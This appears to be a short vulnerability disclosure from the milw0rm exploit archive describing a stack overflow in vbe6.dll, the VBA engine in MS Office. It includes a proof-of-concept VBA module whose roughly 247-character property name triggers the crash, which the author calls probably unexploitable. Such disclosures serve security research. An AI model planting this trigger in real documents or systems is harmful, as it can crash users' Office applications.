@@ -1,0 +1,17 @@
+Stack overflow in vbe6.dll, (used by all versions of MS Office)
+The overflow occurs in Visual Basic for Application. 
+Creating a property with a long name ( about 247 chars) results in a stack overflow in vbe6.dll which overwrites with a null byte the first byte of the return address.
+
+Probably impossible to exploit, but who knows? ^^ At least, there still exist stack overflows in Office apps :P
+
+Marsu <Marsupilamipowa@hotmail.fr>
+
+Module1.bas:
+
+Attribute VB_Name = "Module1"
+
+Public Property Get aaabcdefghissssssaaaaaaaaaaaaaaaaaaaaaaaaaadaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabdaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaadaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaasssssssssssssssssssssssssssssssssssssssssssssssssssade() As Variant
+  
+End Property
+
+# milw0rm.com [2008-03-30]
